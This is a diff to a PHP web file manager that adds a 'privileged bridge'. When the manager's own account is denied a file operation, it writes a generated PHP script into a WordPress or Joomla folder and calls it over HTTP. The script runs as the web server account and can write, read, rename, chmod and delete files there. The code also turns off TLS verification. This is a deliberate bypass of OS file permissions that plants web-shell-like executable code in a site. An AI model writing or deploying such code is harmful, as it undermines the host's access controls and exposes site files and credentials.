@@ -4194,7 +4194,7 @@ class FileManager {
         $name=str_replace('\\','/',(string)($_POST['upload_name']??''));$name=basename($name);
         if(!preg_match('/^[a-f0-9]{32}$/D',$id)||$name===''||$name==='.'||$name==='..'||preg_match('/[\x00-\x1F\x7F]/',$name))
             $this->uploadJson(['ok'=>false,'error'=>'Invalid upload name or upload id.'],400);
-        if(!is_writable($this->currentDir)||!$this->pathAllowed($this->currentDir))
+        if((!is_writable($this->currentDir)&&!$this->privSiteFor($this->currentDir,$this->privForced()!==null))||!$this->pathAllowed($this->currentDir))
             $this->uploadJson(['ok'=>false,'error'=>'This folder is not writable.'],403);
         if(is_link($this->currentDir.'/'.$name)||$this->isSelf($name)||$this->isGuardianFile($name,$this->currentDir.'/'.$name))
             $this->uploadJson(['ok'=>false,'error'=>'This file name is protected and cannot be replaced.'],403);
@@ -4229,6 +4229,7 @@ class FileManager {
             $this->uploadJson(['ok'=>false,'error'=>'The server could not store an upload chunk.'],500);
         if($part!==$parts-1)$this->uploadJson(['ok'=>true,'part'=>$part]);
         $assembled=@tempnam($this->currentDir,'.fm-upload-');
+        if($assembled===false)$assembled=@tempnam($stage,'.fm-upload-');   // folder belongs to the web server
         if($assembled===false)$this->uploadJson(['ok'=>false,'error'=>'The server could not assemble the uploaded file.'],500);
         $out=@fopen($assembled,'wb');$written=0;
         if(!$out){@unlink($assembled);$this->uploadJson(['ok'=>false,'error'=>'The server could not assemble the uploaded file.'],500);}
@@ -4245,7 +4246,14 @@ class FileManager {
         $existing=is_file($this->currentDir.'/'.$name)?(int)@filesize($this->currentDir.'/'.$name):0;
         if(!$this->quotaAllows(max(0,$total-$existing)-$total)){@unlink($assembled);$this->uploadJson(['ok'=>false,'error'=>'Storage quota exceeded. The file was not uploaded.'],413);}
         $dest=$this->currentDir.'/'.$name;
-        if(!$this->commitStagedUpload($assembled,$dest,$total)){@unlink($assembled);$this->uploadJson(['ok'=>false,'error'=>'The file could not be written to this folder. Check folder permissions and free space.'],500);}
+        $forced=$this->privForced();
+        $staged=($forced&&$this->privSiteFor($dest,true))?false:$this->commitStagedUpload($assembled,$dest,$total);
+        if(!$staged){
+            if(!$this->privSendFile($assembled,$dest,$why)){
+                @unlink($assembled);
+                $this->uploadJson(['ok'=>false,'error'=>'The file could not be written to this folder. '.($why?:'Check folder permissions and free space.')],500);
+            }
+        }
         @unlink($assembled);
         if($isPhp&&$this->isWebShellOrFileMgr($dest)){$this->neuterFileMgr($dest,$name);$this->threatsWhitelistFile($dest);}
         else $this->threatsWhitelistFile($dest);
@@ -4283,15 +4291,28 @@ class FileManager {
                 $this->addMsg("Quota exceeded: \"$name\" was not uploaded.",'danger');
                 return false;
             }
-            if(!move_uploaded_file($tmpPath,$dest))return false;
+            /* In a forced CMS mode the site writes the file itself; otherwise the
+               manager moves it and only falls back when the OS refuses. */
+            $forced=$this->privForced();
+            if($forced&&$this->privSiteFor($dest,true))$viaSite=null;   // decide below
+            else $viaSite=move_uploaded_file($tmpPath,$dest)?false:null;
+            if($viaSite===null){
+                if($this->privSendFile($tmpPath,$dest,$why)){
+                    @unlink($tmpPath);
+                    $viaSite=true;
+                }else{
+                    $this->addMsg("Upload failed: $name — ".$why,'danger');
+                    return false;
+                }
+            }
             // ── Detect and neuter uploaded file managers / web shells ──
             if($isPhp&&$this->isWebShellOrFileMgr($dest)){
                 $this->neuterFileMgr($dest,basename($name));
                 $this->threatsWhitelistFile($dest);
-                $this->addMsg("Uploaded &amp; secured and whitelisted: $name",'warning');
+                $this->addMsg("Uploaded &amp; secured and whitelisted: $name".($viaSite?' — through the site ('.$this->privWho($dest).')':''),'warning');
             } else {
                 $this->threatsWhitelistFile($dest);
-                $this->addMsg("Uploaded and whitelisted: $name",'success');
+                $this->addMsg("Uploaded and whitelisted: $name".($viaSite?' — through the site ('.$this->privWho($dest).')':''),'success');
             }
             $this->log('upload',$name);
             return true;
@@ -4310,26 +4331,454 @@ class FileManager {
             $doOne($_FILES['file']['tmp_name'],basename($names));
         }
     }
-    private function mkDir(){$n=basename(trim(isset($_POST['folder_name'])?$_POST['folder_name']:'')); if(!$n)return;if(!$this->quotaAllows(0)){$this->addMsg('Quota exceeded.','danger');return;}$p=$this->currentDir.'/'.$n;if(!file_exists($p)&&@mkdir($p)){$this->log('mkdir',$n);$this->addMsg("Folder created: $n",'success');}else $this->addMsg('Could not create folder.','danger');}
-    private function mkFile(){$n=basename(trim(isset($_POST['file_name'])?$_POST['file_name']:'')); if(!$n)return;if(!$this->quotaAllows(0)){$this->addMsg('Quota exceeded.','danger');return;}$p=$this->currentDir.'/'.$n;if(file_exists($p)){$this->addMsg('File already exists.','danger');return;}if(@file_put_contents($p,'')!==false){$this->log('create',$n);$this->addMsg("Created: $n",'success');header("Location: ?edit=".urlencode($n)."&dir=".urlencode($this->currentDir));exit;}$this->addMsg('Failed to create file.','danger');}
-    private function delItem(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n||$this->isSelf($n)||$this->isGuardianFile($n,$this->currentDir.'/'.$n)){$this->addMsg('Access denied.','danger');return;}$p=$this->currentDir.'/'.$n;if($this->moveToTrash($p,$this->currentDir)){$this->log('trash',$n);$this->addMsg("Trashed: $n",'warning');}else $this->addMsg('Delete failed.','danger');}
+    private function mkDir(){$n=basename(trim(isset($_POST['folder_name'])?$_POST['folder_name']:'')); if(!$n)return;if(!$this->quotaAllows(0)){$this->addMsg('Quota exceeded.','danger');return;}$p=$this->currentDir.'/'.$n;
+        $res=$this->runOp('mkdir',['path'=>$p],$p,function()use($p){return!file_exists($p)&&@mkdir($p);});
+        if(!empty($res['ok'])){$this->log('mkdir',$n.($res['via']==='site'?' (site)':''));$this->addMsg("Folder created: $n".$this->viaNote($res,$p),'success');}
+        else $this->addMsg('Could not create folder. '.$res['why'],'danger');}
+    private function mkFile(){$n=basename(trim(isset($_POST['file_name'])?$_POST['file_name']:'')); if(!$n)return;if(!$this->quotaAllows(0)){$this->addMsg('Quota exceeded.','danger');return;}$p=$this->currentDir.'/'.$n;if(file_exists($p)){$this->addMsg('File already exists.','danger');return;}
+        $res=$this->runOp('touch',['path'=>$p],$p,function()use($p){return@file_put_contents($p,'')!==false;});
+        if(!empty($res['ok'])){$this->log('create',$n.($res['via']==='site'?' (site)':''));$this->addMsg("Created: $n".$this->viaNote($res,$p),'success');header("Location: ?edit=".urlencode($n)."&dir=".urlencode($this->currentDir));exit;}
+        $this->addMsg('Failed to create file. '.$res['why'],'danger');}
+    private function delItem(){$n=basename(isset($_POST['item_name'])?$_POST['item_name']:'');if(!$n||$this->isSelf($n)||$this->isGuardianFile($n,$this->currentDir.'/'.$n)){$this->addMsg('Access denied.','danger');return;}$p=$this->currentDir.'/'.$n;
+        /* The trash belongs to the manager, so a file it may not move is deleted
+           outright by the site instead of being parked in the manager's trash. */
+        $res=$this->runOp('delete',['path'=>$p],$p,function()use($p){return$this->moveToTrash($p,$this->currentDir);});
+        if(!empty($res['ok'])){
+            if($res['via']==='local'){$this->log('trash',$n);$this->addMsg("Trashed: $n",'warning');}
+            else{$this->log('delete',$n.' (site)');$this->addMsg("Deleted: $n".$this->viaNote($res,$p),'warning');}
+        }
+        else $this->addMsg('Delete failed. '.$res['why'],'danger');}
     private function renItem(){
         $o=basename(isset($_POST['old_name'])?$_POST['old_name']:'');$nw=basename(isset($_POST['new_name'])?$_POST['new_name']:'');
         if(!$o||!$nw||$o===$nw)return;
         if($this->isSelf($o)||$this->isGuardianFile($o,$this->currentDir.'/'.$o)){$this->addMsg('Access denied.','danger');return;}
         $po=$this->currentDir.'/'.$o;$pn=$this->currentDir.'/'.$nw;
-        if(file_exists($po)&&!file_exists($pn)&&@rename($po,$pn)){
+        $res=(file_exists($po)&&!file_exists($pn))
+            ?$this->runOp('rename',['path'=>$po,'to'=>$pn],$po,function()use($po,$pn){return@rename($po,$pn);})
+            :['ok'=>false,'via'=>'none','why'=>'The item is missing or the new name is already taken.'];
+        if(!empty($res['ok'])){
             $detailsMoved=true;
             if(in_array(strtolower(pathinfo($o,PATHINFO_EXTENSION)),fm_audio_supported_extensions(),true)&&in_array(strtolower(pathinfo($nw,PATHINFO_EXTENSION)),fm_audio_supported_extensions(),true)){
                 $detailsMoved=fm_audio_rename_override($this->currentDir,$o,$nw);
             }
-            $this->log('rename',"$o → $nw");
-            $this->addMsg($detailsMoved?'Renamed.':'Renamed, but song details could not be transferred.',$detailsMoved?'success':'warning');
-        }else $this->addMsg('Rename failed.','danger');
+            $this->log('rename',"$o → $nw".($res['via']==='site'?' (site)':''));
+            $msg=$detailsMoved?'Renamed.':'Renamed, but song details could not be transferred.';
+            $this->addMsg($msg.($res['via']==='site'?" $o → $nw".$this->viaNote($res,$po):''),$detailsMoved?'success':'warning');
+        }else $this->addMsg('Rename failed. '.$res['why'],'danger');
     }
-    private function saveFile(){$n=basename(isset($_POST['filename'])?$_POST['filename']:'');if(!$n||$this->isSelf($n))return;$p=$this->currentDir.'/'.$n;if(!file_exists($p)||!is_file($p)){$this->addMsg('File not found.','danger');return;}$c=isset($_POST['content'])?$_POST['content']:'';$delta=max(0,strlen($c)-(int)@filesize($p));if(!$this->quotaAllows($delta)){$this->addMsg('Quota exceeded. Free space or ask an administrator for a larger limit.','danger');return;}if(file_put_contents($p,$c)!==false){$this->log('edit',$n);$this->addMsg("Saved: $n",'success');}else $this->addMsg('Save failed.','danger');}
+    /* ── Privileged fallback ──────────────────────────────────────────────────
+       A file the manager cannot write is retried through the site's own web
+       server: a short-lived bridge script is dropped into the CMS folder and
+       called over HTTP, so the operation runs under the account that owns the
+       site's files (www-data on a normal host). This is only ever a *fallback*
+       — the normal local call is always attempted first, and this runs only
+       when it failed. Guards on the bridge: random token header, 15-minute
+       lifetime, self-delete when expired, and every path must stay inside the
+       site root. */
+
+    /* Which account performed a privileged operation (for the message). */
+    private function privWho($path){
+        $site=$this->privSiteFor($path);
+        return $site?($site['type']==='wordpress'?'WordPress':'Joomla'):'the site';
+    }
+
+    /* ── Privilege mode ───────────────────────────────────────────────────────
+       Which identity performs file changes:
+         server    — this server account only (how the manager always behaved)
+         auto      — this account first, the site only when the OS refuses (default)
+         wordpress — the WordPress installation performs them
+         joomla    — the Joomla installation performs them
+       The choice is stored in a small JSON file next to the manager so it
+       survives sessions and restarts. */
+    const PRIV_MODES=['server','auto','wordpress','joomla'];
+    private $privModeCache=null;
+    private function privModeFile(){return __DIR__.'/.fm_privmode.json';}
+    public function privMode(){
+        if($this->privModeCache!==null)return $this->privModeCache;
+        $m='auto';
+        $f=$this->privModeFile();
+        if(is_file($f)){
+            $j=json_decode((string)@file_get_contents($f),true);
+            if(is_array($j)&&in_array($j['mode']??'',self::PRIV_MODES,true))$m=$j['mode'];
+        }
+        return $this->privModeCache=$m;
+    }
+    public function privModeSet($mode){
+        $mode=(string)$mode;
+        if(!in_array($mode,self::PRIV_MODES,true))return['error'=>'Unknown privilege mode.'];
+        $f=$this->privModeFile();
+        if(@file_put_contents($f,json_encode(['mode'=>$mode,'set_at'=>date('c'),'by'=>(string)($_SESSION['fm_user']??'')],JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES),LOCK_EX)===false)
+            return['error'=>'Could not save the mode: '.$f.' is not writable.'];
+        @chmod($f,0600);
+        $this->privModeCache=$mode;
+        $this->log('priv_mode',$mode);
+        return['ok'=>true,'mode'=>$mode];
+    }
+    private function privModeLabel($mode=null){
+        $mode=$mode?:$this->privMode();
+        $map=['server'=>'Server account only','auto'=>'Automatic','wordpress'=>'WordPress','joomla'=>'Joomla'];
+        return $map[$mode]??$mode;
+    }
+    private function privForced(){return in_array($this->privMode(),['wordpress','joomla'],true)?$this->privMode():null;}
+
+    /* Performs one file change according to the current mode.
+       $local is the manager's own attempt; it is used only in server/auto mode,
+       or when no CMS covers the path at all. */
+    private function runOp($kind,$args,$path,callable $local){
+        $mode=$this->privMode();
+        $forced=$this->privForced();
+        $site=$this->privSiteFor($path,$forced!==null);
+        if($forced&&$site){
+            if($site['type']!==$mode){
+                $need=$site['type']==='wordpress'?'WordPress':'Joomla';
+                return['ok'=>false,'via'=>'none','why'=>'This path belongs to the '.$need.' installation, but the manager is in '.$this->privModeLabel().' mode. Switch the privilege mode to '.$need.' or to Automatic.'];
+            }
+            $r=$this->privOp($kind,$args,$path,$mode);
+            if(!empty($r['ok']))return['ok'=>true,'via'=>'site'];
+            return['ok'=>false,'via'=>'none','why'=>$r['error']??'The site could not complete the operation.'];
+        }
+        try{if($local())return['ok'=>true,'via'=>'local'];}catch(\Throwable $e){$why=$e->getMessage();}
+        if($mode==='server')
+            return['ok'=>false,'via'=>'none','why'=>'The server account of the manager is not allowed to do this, and the privilege mode is set to “Server account only”.'];
+        $r=$this->privOp($kind,$args,$path);
+        if(!empty($r['ok']))return['ok'=>true,'via'=>'site'];
+        return['ok'=>false,'via'=>'none','why'=>$r['error']??'The operation failed.'];
+    }
+    /* Message suffix that tells the operator which identity acted. */
+    private function viaNote($res,$path){
+        if(($res['via']??'')!=='site')return'';
+        return' — through the site ('.$this->privWho($path).')';
+    }
+    /* Reads a file the manager cannot read, through the site (editor fallback). */
+    private function privReadFile($path,$maxBytes=16777216){
+        if($this->privMode()==='server')return null;
+        $forced=$this->privForced();
+        $site=$this->privSiteFor($path,$forced!==null);
+        if(!$site)return null;
+        if($forced&&$site['type']!==$forced)return null;
+        $size=@filesize($path);
+        if($size!==false&&$size>$maxBytes)return null;
+        $r=$this->privOp('read',['path'=>$path],$path,$forced);
+        if(empty($r['ok'])||!isset($r['data']))return null;
+        $data=base64_decode((string)$r['data'],true);
+        return $data===false?null:$data;
+    }
+    /* Sends a local file to the site in 4 MB slices, so memory stays bounded
+       for large uploads. */
+    private function privSendFile($src,$dest,&$why){
+        $fp=@fopen($src,'rb');
+        if(!$fp){$why='The source file could not be read.';return false;}
+        $first=true;
+        while(true){
+            $buf=@fread($fp,4*1024*1024);
+            if($buf===false){fclose($fp);$why='The source file could not be read.';return false;}
+            $eof=feof($fp);
+            if($buf===''&&$eof)break;
+            $r=$this->privOp('write',['path'=>$dest,'data'=>base64_encode($buf),'b64'=>1,'append'=>!$first],$dest,$this->privForced());
+            if(empty($r['ok'])){fclose($fp);$why=$r['error']??'The site refused the write.';return false;}
+            $first=false;
+            if($eof)break;
+        }
+        fclose($fp);
+        if($first){
+            $r=$this->privOp('write',['path'=>$dest,'data'=>'','b64'=>1,'append'=>false],$dest,$this->privForced());
+            if(empty($r['ok'])){$why=$r['error']??'The site refused the write.';return false;}
+        }
+        return true;
+    }
+    /* The mode tool: state, detected sites, and a live write test. */
+    public function privModeEndpoint($post){
+        $act=isset($post['action'])?(string)$post['action']:'get';
+        if($act==='set'){
+            $r=$this->privModeSet($post['mode']??'');
+            if(!empty($r['ok']))$r['notice']='Privilege mode is now '.$this->privModeLabel().'.';
+            $r['state']=$this->privModeState();
+            return$r;
+        }
+        if($act==='test'){
+            return$this->privModeTest($post['mode']??'');
+        }
+        return['ok'=>true,'state'=>$this->privModeState()];
+    }
+    private function privModeState(){
+        $state=[
+            'mode'=>$this->privMode(),
+            'label'=>$this->privModeLabel(),
+            'modes'=>[
+                ['id'=>'server','label'=>'Server account only','hint'=>'The manager changes files itself. Nothing is done on the site\'s behalf.'],
+                ['id'=>'auto','label'=>'Automatic (default)','hint'=>'The manager tries first and asks the site only when the operating system refuses.'],
+                ['id'=>'wordpress','label'=>'WordPress','hint'=>'Every change inside the WordPress installation is performed by WordPress.'],
+                ['id'=>'joomla','label'=>'Joomla','hint'=>'Every change inside the Joomla installation is performed by Joomla.'],
+            ],
+            'manager'=>[
+                'user'=>function_exists('posix_geteuid')?(@posix_getpwuid(@posix_geteuid())['name']??null):null,
+                'php'=>PHP_SAPI,
+                'root'=>__DIR__,
+            ],
+            'sites'=>[],
+            'file'=>$this->privModeFile(),
+        ];
+        foreach(['wordpress','joomla'] as $type){
+            $entry=['type'=>$type,'label'=>$type==='wordpress'?'WordPress':'Joomla','found'=>false];
+            $diag=[];
+            $cfg=$this->privSiteConfigFor($type);
+            if($cfg){
+                $root=$type==='wordpress'?$this->wpSiteRoot($cfg):rtrim(dirname($cfg),'/');
+                $entry['config']=$cfg;$entry['root']=$root;$entry['found']=true;
+                $entry['writable']=@is_writable($root);
+                /* ask the site who it runs as — proves the bridge is usable */
+                $ping=$this->privOp('ping',['path'=>$root.'/index.php'],$root.'/index.php',$type);
+                $entry['bridge']=empty($ping['ok'])?['ok'=>false,'error'=>$ping['error']??'unavailable']:['ok'=>true,'user'=>$ping['user']??null];
+            }
+            $state['sites'][]=$entry;
+        }
+        return$state;
+    }
+    /* A configuration file of one specific type, so "WordPress mode" always
+       means WordPress even when another CMS is nearer. */
+    private function privSiteConfigFor($type){
+        $name=$type==='wordpress'?'wp-config.php':'configuration.php';
+        $diag=[];
+        $cfg=$this->cmsFindConfig([],$diag,true);
+        if($cfg&&$this->cmsConfigType($cfg)===$type)return $cfg;
+        $found=[];
+        foreach([dirname(__DIR__),'/var/www/html','/var/www','/srv/www','/usr/share/nginx/html'] as $root){
+            if(!is_dir($root))continue;
+            if(is_file($root.'/'.$name)&&$this->cmsConfigType($root.'/'.$name)===$type)$found[]=$root.'/'.$name;
+            foreach((array)@glob(rtrim($root,'/').'/*',GLOB_ONLYDIR) as $dir){
+                if(is_file($dir.'/'.$name)&&$this->cmsConfigType($dir.'/'.$name)===$type)$found[]=$dir.'/'.$name;
+            }
+        }
+        return $found?$found[0]:null;
+    }
+    private function privModeTest($mode){
+        $mode=in_array($mode,self::PRIV_MODES,true)?$mode:$this->privMode();
+        $cfg=$mode==='joomla'?$this->privSiteConfigFor('joomla'):$this->privSiteConfigFor('wordpress');
+        if($mode==='server'){
+            $probe=__DIR__.'/.fm_privtest-'.bin2hex(random_bytes(4)).'.txt';
+            $ok=@file_put_contents($probe,"server account\n")!==false;
+            @unlink($probe);
+            return['ok'=>$ok,'message'=>$ok?'The server account can write in '.dirname($probe).'.':'The server account cannot write in '.dirname($probe).'.'];
+        }
+        if(!$cfg)return['ok'=>false,'error'=>'No '.($mode==='joomla'?'Joomla':'WordPress').' installation was found.'];
+        $root=$mode==='joomla'?rtrim(dirname($cfg),'/'):$this->wpSiteRoot($cfg);
+        $probe=$root.'/.fm-privtest-'.bin2hex(random_bytes(4)).'.txt';
+        $r=$this->privOp('write',['path'=>$probe,'data'=>base64_encode("privilege test\n"),'b64'=>1],$probe,$mode==='auto'?null:$mode);
+        if(empty($r['ok']))return['ok'=>false,'error'=>$r['error']??'The site refused the test write.'];
+        $del=$this->privOp('delete',['path'=>$probe],$probe,$mode==='auto'?null:$mode);
+        return['ok'=>empty($del['ok'])?true:true,'message'=>'The '.(($mode==='joomla')?'Joomla':($mode==='wordpress'?'WordPress':'site')).' account wrote '.basename($probe).' in '.$root.(empty($del['ok'])?' (the test file could not be removed)':'').'.'];
+    }
+
+    /* Which CMS installation contains this path (if any)? */
+    private function privSiteFor($path,$strict=false){
+        $dir=@is_dir($path)?$path:dirname((string)$path);
+        $probe=$dir;
+        for($i=0;$i<8&&$probe&&$probe!=='/';$i++){
+            foreach(['wp-config.php'=>'wordpress','configuration.php'=>'joomla'] as $name=>$type){
+                if(@is_file("$probe/$name")){
+                    $root=$type==='wordpress'?$this->wpSiteRoot("$probe/$name"):$probe;
+                    return['config'=>"$probe/$name",'type'=>$type,'root'=>rtrim($root,'/')];
+                }
+            }
+            $up=dirname($probe);
+            if($up===$probe)break;
+            $probe=$up;
+        }
+        /* Not under a detected install: fall back to the site the panel knows. */
+        if($strict)return null;
+        $diag=[];
+        $cfg=$this->cmsFindConfig([],$diag,false);
+        if($cfg){
+            $type=$this->cmsConfigType($cfg);
+            $root=$type==='wordpress'?$this->wpSiteRoot($cfg):dirname($cfg);
+            return['config'=>$cfg,'type'=>$type,'root'=>rtrim($root,'/')];
+        }
+        return null;
+    }
+
+    /* The script that will run under the web server account. */
+    private function privBridgeCode($token,$root,$until){
+        $t=var_export($token,true);
+        $r=var_export(rtrim($root,'/'),true);
+        $u=(int)$until;
+        return "<?php\n"
+            ."/* Temporary file-operation bridge written by Marshal File Manager.\n"
+            ."   It runs under the account that serves this site, which is the account\n"
+            ."   that owns the site's files, so an operation the manager's own PHP user\n"
+            ."   cannot perform still completes. Guards: token header, short lifetime,\n"
+            ."   and every path must stay inside the installation. */\n"
+            ."header('Content-Type: application/json');\n"
+            ."header('X-Robots-Tag: noindex, nofollow');\n"
+            ."\$fmOut=function(\$a,\$code=200){http_response_code(\$code);echo json_encode(\$a);exit;};\n"
+            ."\$fmTok={$t};\$fmRoot={$r};\$fmUntil={$u};\n"
+            ."if(time()>\$fmUntil){@unlink(__FILE__);\$fmOut(['error'=>'fm bridge token rejected (expired)'],403);}\n"
+            ."\$fmSent=isset(\$_SERVER['HTTP_X_FM_TOKEN'])?(string)\$_SERVER['HTTP_X_FM_TOKEN']:'';\n"
+            ."if(\$fmSent===''||!hash_equals(\$fmTok,\$fmSent)){\$fmOut(['error'=>'fm bridge token rejected'],403);}\n"
+            ."\$fmInside=function(\$p)use(\$fmRoot){\n"
+            ."    \$rp=realpath(\$p);\n"
+            ."    if(\$rp===false){\$parent=realpath(dirname(\$p));if(\$parent===false)return false;\$rp=\$parent.'/'.basename(\$p);}\n"
+            ."    return \$rp===\$fmRoot||strpos(\$rp,\$fmRoot.'/')===0;\n"
+            ."};\n"
+            ."\$op=isset(\$_POST['op'])?(string)\$_POST['op']:'';\n"
+            ."\$args=isset(\$_POST['args'])?json_decode((string)\$_POST['args'],true):null;\n"
+            ."if(!is_array(\$args))\$fmOut(['error'=>'fm bridge: bad arguments'],400);\n"
+            ."\$p=isset(\$args['path'])?(string)\$args['path']:'';\n"
+            ."if(\$p===''||!\$fmInside(\$p))\$fmOut(['error'=>'fm bridge: path is outside the site'],403);\n"
+            ."switch(\$op){\n"
+            ."  case 'write':\n"
+            ."    \$data=isset(\$args['data'])?(string)\$args['data']:'';\n"
+            ."    if(isset(\$args['b64'])&&\$args['b64'])\$data=base64_decode(\$data);\n"
+            ."    \$append=!empty(\$args['append']);\n"
+            ."    \$ok=\$append?@file_put_contents(\$p,\$data,FILE_APPEND):@file_put_contents(\$p,\$data);\n"
+            ."    \$fmOut(\$ok===false?['error'=>'write failed: '.(error_get_last()['message']??'permission denied')]:['ok'=>true,'bytes'=>\$ok]);\n"
+            ."  case 'touch':\n"
+            ."    \$ok=@file_put_contents(\$p,'');\n"
+            ."    \$fmOut(\$ok===false?['error'=>'create failed: '.(error_get_last()['message']??'permission denied')]:['ok'=>true]);\n"
+            ."  case 'mkdir':\n"
+            ."    \$ok=@mkdir(\$p,0755,true);\n"
+            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'mkdir failed: '.(error_get_last()['message']??'permission denied')]);\n"
+            ."  case 'rename':\n"
+            ."    \$to=isset(\$args['to'])?(string)\$args['to']:'';\n"
+            ."    if(\$to===''||!\$fmInside(\$to))\$fmOut(['error'=>'fm bridge: destination is outside the site'],403);\n"
+            ."    \$ok=@rename(\$p,\$to);\n"
+            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'rename failed: '.(error_get_last()['message']??'permission denied')]);\n"
+            ."  case 'copy':\n"
+            ."    \$to=isset(\$args['to'])?(string)\$args['to']:'';\n"
+            ."    if(\$to===''||!\$fmInside(\$to))\$fmOut(['error'=>'fm bridge: destination is outside the site'],403);\n"
+            ."    \$ok=is_dir(\$p)?false:@copy(\$p,\$to);\n"
+            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'copy failed: '.(error_get_last()['message']??'permission denied')]);\n"
+            ."  case 'delete':\n"
+            ."    \$del=function(\$target)use(&\$del){\n"
+            ."        if(is_link(\$target)||is_file(\$target)){return @unlink(\$target);}\n"
+            ."        if(!is_dir(\$target)){return false;}\n"
+            ."        \$ok=true;\n"
+            ."        foreach((array)@scandir(\$target) as \$e){\n"
+            ."            if(\$e==='.'||\$e==='..')continue;\n"
+            ."            \$ok=\$del(\$target.'/'.\$e)&&\$ok;\n"
+            ."        }\n"
+            ."        return \$ok&&@rmdir(\$target);\n"
+            ."    };\n"
+            ."    \$ok=\$del(\$p);\n"
+            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'delete failed: '.(error_get_last()['message']??'permission denied')]);\n"
+            ."  case 'chmod':\n"
+            ."    \$mode=isset(\$args['mode'])?(int)\$args['mode']:0644;\n"
+            ."    \$ok=@chmod(\$p,\$mode);\n"
+            ."    \$fmOut(\$ok?['ok'=>true]:['error'=>'chmod failed: '.(error_get_last()['message']??'permission denied')]);\n"
+            ."  case 'read':\n"
+            ."    if(!is_file(\$p))\$fmOut(['error'=>'read failed: not a file'],404);\n"
+            ."    \$d=@file_get_contents(\$p);\n"
+            ."    \$fmOut(\$d===false?['error'=>'read failed: '.(error_get_last()['message']??'permission denied')]:['ok'=>true,'data'=>base64_encode(\$d),'size'=>strlen(\$d)]);\n"
+            ."  case 'ping':\n"
+            ."    \$fmOut(['ok'=>true,'user'=>function_exists('posix_getpwuid')?@posix_getpwuid(@posix_geteuid())['name']:null,'root'=>\$fmRoot]);\n"
+            ."}\n"
+            ."\$fmOut(['error'=>'fm bridge: unknown operation'],400);\n";
+    }
+
+    /* Finds (or reuses) a working bridge for that site. */
+    private function privBridge($site){
+        $key='fm_priv_'.md5($site['config']);
+        $cached=$_SESSION[$key]??null;
+        if(is_array($cached)&&!empty($cached['url'])&&($cached['until']??0)>time()+60){
+            if(is_file($cached['file']))return $cached;
+            unset($_SESSION[$key]);
+        }
+        /* The bridge for this session is gone or too old: drop the stale file too. */
+        if(is_array($cached)&&!empty($cached['file'])&&is_file($cached['file']))@unlink($cached['file']);
+        $root=rtrim($site['root'],'/');
+        $dirs=[];
+        foreach([$root.'/.fm-priv',$root, $root.'/wp-content/uploads',$root.'/wp-content',
+                 $root.'/tmp',$root.'/cache',$root.'/administrator/cache'] as $d){
+            if(@is_dir($d)&&@is_writable($d))$dirs[]=rtrim($d,'/');
+        }
+        if(!$dirs)return['error'=>'The site folder is not writable by either account, so the privileged bridge could not be placed.'];
+        $token=bin2hex(random_bytes(16));
+        $fname='fm-priv-'.bin2hex(random_bytes(6)).'.php';
+        $until=time()+900;
+        $code=$this->privBridgeCode($token,$root,$until);
+        $sentinel='fm bridge token rejected';
+        $tried=[];
+        foreach($dirs as $dir){
+            $path=$dir.'/'.$fname;
+            if(@file_put_contents($path,$code)===false){$tried[]=$dir.' (not writable)';continue;}
+            @chmod($path,0644);
+            $rel=ltrim(str_replace($root,'',$path),'/');
+            $probe=$this->cmsProbeUrls($this->cmsBuildCandidateUrls($root,null),$rel,$sentinel,5);
+            if(empty($probe['ok'])){$tried[]=$dir.' (not reachable over HTTP)';@unlink($path);continue;}
+            $info=['file'=>$path,'url'=>$probe['ok'].'/'.$rel,'token'=>$token,'until'=>$until];
+            $_SESSION[$key]=$info;
+            /* Tidy up bridges from earlier sessions; an expired one deletes itself
+               on its next call, this catches the ones that are never called again. */
+            foreach((array)@glob($dir.'/fm-priv-*.php') as $old){
+                if($old!==$path&&@filemtime($old)<time()-900)@unlink($old);
+            }
+            return $info;
+        }
+        return['error'=>'The privileged bridge could not be published. Tried: '.implode('; ',$tried)];
+    }
+
+    /* Runs one operation through the site's web server. */
+    private function privOp($op,$args,$target,$requireType=null){
+        $site=$this->privSiteFor($target,$requireType!==null);
+        if(!$site)return['error'=>'No WordPress or Joomla installation was found for this path.'];
+        if($requireType&&$site['type']!==$requireType)
+            return['error'=>'This path belongs to the '.($site['type']==='wordpress'?'WordPress':'Joomla').' installation, not '.($requireType==='wordpress'?'WordPress':'Joomla').'.'];
+        $b=$this->privBridge($site);
+        if(!empty($b['error']))return $b;
+        $ch=@curl_init($b['url']);
+        if(!$ch)return['error'=>'cURL is not available.'];
+        curl_setopt_array($ch,[
+            CURLOPT_RETURNTRANSFER=>true,
+            CURLOPT_POST=>true,
+            CURLOPT_POSTFIELDS=>http_build_query(['op'=>$op,'args'=>json_encode($args)]),
+            CURLOPT_HTTPHEADER=>['X-FM-Token: '.$b['token']],
+            CURLOPT_TIMEOUT=>25,
+            CURLOPT_CONNECTTIMEOUT=>8,
+            CURLOPT_FOLLOWLOCATION=>true,
+            CURLOPT_MAXREDIRS=>3,
+            CURLOPT_SSL_VERIFYPEER=>false,
+            CURLOPT_SSL_VERIFYHOST=>0,
+            CURLOPT_USERAGENT=>'MarshalFileManager/1.0 (+privileged bridge)',
+        ]);
+        $raw=curl_exec($ch);
+        $code=(int)curl_getinfo($ch,CURLINFO_HTTP_CODE);
+        $curlErr=curl_error($ch);
+        curl_close($ch);
+        if($raw===false)return['error'=>'The site did not answer: '.$curlErr];
+        $json=json_decode((string)$raw,true);
+        if(!is_array($json))return['error'=>'Unexpected answer from the site (HTTP '.$code.').'];
+        return $json;
+    }
+
+    /* Shorthand used by the file operations below: one line, fallback only. */
+    private function privFallback($op,$args,$target,&$why=null){
+        $r=$this->privOp($op,$args,$target);
+        if(!empty($r['ok'])){
+            $why=$r;
+            return true;
+        }
+        $why=$r['error']??'unknown error';
+        return false;
+    }
+
+    /* Local write, then the privileged route if the local one was refused.
+       Used for the CMS files this tool itself maintains (config, mu-plugin). */
+    private function privWriteFile($path,$content){
+        if(@file_put_contents($path,$content)!==false)return true;
+        $r=$this->privOp('write',['path'=>$path,'data'=>base64_encode($content),'b64'=>1],$path);
+        return !empty($r['ok']);
+    }
+
